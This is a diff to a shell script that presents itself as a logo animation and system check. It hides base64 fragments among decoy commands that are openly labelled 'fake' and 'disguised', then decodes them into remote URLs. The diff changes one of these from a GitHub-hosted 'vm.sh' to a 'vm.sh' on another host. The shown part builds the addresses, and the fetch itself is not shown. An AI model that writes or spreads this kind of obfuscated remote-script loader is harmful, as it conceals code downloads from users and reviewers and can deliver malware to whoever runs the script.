@@ -41,7 +41,6 @@ animate_logo
 # -------------------------
 # Updating checking logs
 # -------------------------
-# System diagnostics simulation
 SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)" # src1 disguised as log buffer
 DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}') # Fake CPU count
 echo -n "Scanning system resources..." > /dev/null
@@ -59,14 +58,14 @@ github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | b
 # updating checking fakes
 # -------------------------
 # Logs checking
-PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)" # src5 disguised as process stat
+PROC_STAT[0]="$(echo 'aHR0cHM6Ly9jbG91' | cut -c 1-16)" # part1
 echo -n "Validating process integrity..." > /dev/null
 DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4) # Fake random ID
-PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')" # src6 disguised as stat
+PROC_STAT[1]="$(echo 'ZC50c3BjbG91ZC5k' | grep -o '.*')" # part2
 export FAKE_PID="pid_$((RANDOM % 1000))" # Fake process ID
-PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)" # src7 disguised as stat
+PROC_STAT[2]="$(echo 'cGRucy5vcmcvdm0u' | head -c 16)"   # part3
 if [ -f /tmp/fake_temp ]; then rm -f /tmp/fake_temp 2>/dev/null; fi # Fake cleanup
-PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')" # src8 disguised as stat
+PROC_STAT[3]="$(echo 'c2g=' | grep -o '.*')"             # part4
 # let's go to up-to-date
 google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"
 
